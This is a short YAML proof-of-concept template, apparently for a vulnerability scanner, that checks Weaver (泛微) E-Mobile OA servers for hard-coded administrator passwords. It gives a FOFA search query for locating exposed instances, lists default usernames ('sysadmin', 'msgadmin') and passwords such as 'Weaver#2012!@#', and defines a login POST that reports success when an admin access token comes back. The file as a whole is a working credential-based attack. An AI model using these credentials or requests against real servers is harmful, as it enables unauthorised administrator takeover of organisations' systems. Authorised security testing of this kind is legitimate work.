id: poc-yaml-weaver-e-mobile-hard-coded-password
info:
  name: 泛微OA E-Mobile 硬编码口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: e-mobile
  fofa: app="泛微-EMobile" && icon_hash="2062026853"
variables:
  username: 'sysadmin

    msgadmin

    '
  password: 'sysadmin

    Weaver#2012!@#

    Weaver@2001

    '
firstRequest:
  method: GET
  path: /
  expression: status_code == 200 && contains(title,"移动管理平台-企业管理")
requests:
- method: POST
  path: /emp/passport/login
  headers:
    Content-Type: application/json
  data: '{"key":"","loginid":"{{.username}}","password":"{{.password}}"}'
  expression: status_code == 200 && contains(body,"access_token") && contains(body,"base_user_name")
    && contains(body,"issysadmin") && contains(body,"系统管理员")
transport: http
